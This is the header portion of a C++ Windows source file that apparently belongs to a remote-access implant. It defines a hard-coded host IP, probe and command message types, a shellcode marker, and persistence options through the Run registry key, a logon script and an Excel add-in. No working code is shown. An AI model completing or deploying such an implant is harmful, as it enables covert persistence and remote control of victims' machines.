#include <Windows.h>
#include <Strsafe.h>
#include <iostream>
#include <string>
#include <sstream>
#include <algorithm>
#include "resource.h"
#include "Shlwapi.h"

#pragma comment(lib, "Shlwapi.lib")

using std::cout;


#define MAX_CMD_LENGTH 2048
#define PROBE "PROBE"
#define CMD "CMD"
#define HOST "10.240.0.122"
#define MAX_DATA_LENGTH 1048576

#define START "{!"
#define END "!}"
#define NO_SHELLCODE "!@!"

#define PERSIST_RUNKEY 1
#define PERSIST_LOGONSCRIPT 2
#define PERSIST_EXCELADDIN 3

